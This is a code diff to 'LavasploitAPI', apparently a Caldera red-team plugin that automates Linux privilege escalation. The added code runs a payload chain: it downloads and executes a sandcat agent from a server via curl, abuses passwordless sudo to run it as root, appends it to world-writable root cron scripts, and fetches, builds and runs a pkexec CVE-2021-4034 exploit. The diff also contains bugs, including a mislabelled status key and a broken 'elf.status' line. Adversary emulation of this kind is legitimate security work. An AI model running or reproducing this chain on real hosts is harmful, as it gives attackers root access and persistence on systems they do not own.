@@ -23,10 +23,20 @@ class LavasploitAPI:
         self.current_command_name = 'Manual Command'
         self.current_command_description = 'Auto-generated'
         self.attempt_count = 3
+        self.status = {
+            "initialization": -1,
+            "attempt_crontab_reconn": -1,
+            "attempt_crontab_exploit": -1,
+            "attempt_sudo_reconn": -1,
+            "attempt_sudo_exploit": -1,
+            "attempt_cve_reconn": -1,
+            "attempt_cve_exploit": -1,
+            "result":-1
+        }
 
     async def retrieve_status(self, request):
         return web.json_response(dict(
-            pe_status=self.current_command_index,
+            status = self.status,
             attempt_count = self.attempt_count
         ))
 
@@ -37,70 +47,89 @@ class LavasploitAPI:
 
     async def generate_agent_payload(self):
         self.current_command_index = 0
+        self.status['initialization'] = 0
         self.current_command_name = 'Generate Agent Payload'
         self.current_command_description = 'Generate executable agent payload for further use'
         command = '''
         echo 'server="#{server}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v' > caldera_payload && chmod +x caldera_payload
         '''
         result = await self.send_command_and_retrieve_result(command)
-
+        self.status['initialization'] = 1
 
     async def attempt_cve_2021_4034(self):
+        self.status['attempt_cve_reconn'] = 0
         self.current_command_name = 'Reconn for CVE-2021-4034'
         self.current_command_description = 'Reconn for CVE-2021-4034'
         command = '''
         if [ `command -v pkexec` ] && stat -c '%a' $(which pkexec) | grep -q 4755 && [ "$(stat -c '%Y' $(which pkexec))" -lt "1642035600" ]; then echo "True"; else echo "False"; fi
         '''
         is_vulnerable = await self.send_command_and_retrieve_result(command)
+        self.status['attempt_cve_reconn'] = 1
         #is_vulnerable = str(base64.b64decode(result), 'utf-8').strip("\n\r")
         if is_vulnerable == "True":
+            self.status['attempt_cve_exploit'] = 0
             self.current_command_name = 'Exploit CVE-2021-4034'
             self.current_command_description = 'Exploit CVE-2021-4034 with prepared payload'
             command = '''
             curl -X POST -H "file:CVE-2021-4034.zip" #{server}/file/download > CVE-2021-4034.zip && unzip ./CVE-2021-4034.zip && cd ./CVE-2021-4034 && make && ./cve-2021-4034 < #{location}/caldera_payload &
             '''
             result = await self.send_command_and_retrieve_result(command)
+            self.status['attempt_cve_exploit'] = 1
+            return True
+        return False
 
 
 
     async def attempt_Sudo(self):
+        self.status['attempt_sudo_reconn'] = 0
         self.current_command_name = 'Reconn for sudo privileges'
         self.current_command_description = 'Reconn for available sudo privileges for current user without password'
         command = '''timeout 1 sudo -l | grep NOPASSWD | awk -F " " '{print $5}' '''
         current_user_privilege = await self.send_command_and_retrieve_result(command)
+        self.status['attempt_cve_reconn'] = 1
         #current_user_privilege = str(base64.b64decode(result), 'utf-8').strip("\n\r")
         if current_user_privilege == 'ALL':
+            self.status['attempt_sudo_exploit'] = 0
             self.current_command_name = 'Execute payload as Root'
             self.current_command_description = 'Utilize the sudo privilege to execute payload as root'
             command = '''sudo /bin/bash ''' + self.current_path + '''/caldera_payload'''
             result = await self.send_command_and_retrieve_result(command)
+            self.status['attempt_sudo_exploit'] = 1
+            return True
+        return False
 
     async def attempt_crontab(self):
+        self.status['attempt_crontab_reconn'] = 0
         self.current_command_name = 'Reconn for Available Crontab'
         self.current_command_description = 'Reconn for available crontab jobs with root privilege and other-write access'
         reconn_command = '''
         file=$(cat /etc/crontab | grep root | grep -v "cron" | awk -F " " '{print $7}'); for f in $file; do find $f -perm -o=w 2>/dev/null; done
         '''
         writable_file = (await self.send_command_and_retrieve_result(reconn_command)).split()
+        self.status['attempt_crontab_reconn'] = 1
         #writable_file = str(base64.b64decode(result), 'utf-8').strip("\n\r").split()
         for file in writable_file:
+            self.status['attempt_crontab_exploit'] = 0
             self.current_command_name = 'Insert Payload into crontab jobs'
             self.current_command_description = 'insert out agent payload into listed writable file with file lock'
             command = '''echo "flock -xn ''' + self.current_path + '''/agent.lock -c '/bin/bash'''
             command = command + " " + self.current_path + '''/caldera_payload'" >> ''' + file
             result = await self.send_command_and_retrieve_result(command)
-
+            self.status['attempt_crontab_exploit'] = 1
+            return True
+        return False
 
 
     async def run_auto_priv_esc(self, request):
         await self.update_target_info(request)
 
-        #await self.generate_agent_payload()
-        #await self.attempt_cve_2021_4034()
-
-        #await self.attempt_crontab()
-        await self.attempt_Sudo()
-
+        await self.generate_agent_payload()
+        if not await self.attempt_Sudo():
+            if not await self.attempt_crontab():
+                if not await self.attempt_cve_2021_4034():
+                    self.status['result'] = 1
+                    return web.json_response('auto PE Failed.')
+        elf.status['result'] = 1
         return web.json_response('auto PE completed')
 
     async def update_target_info(self, request):
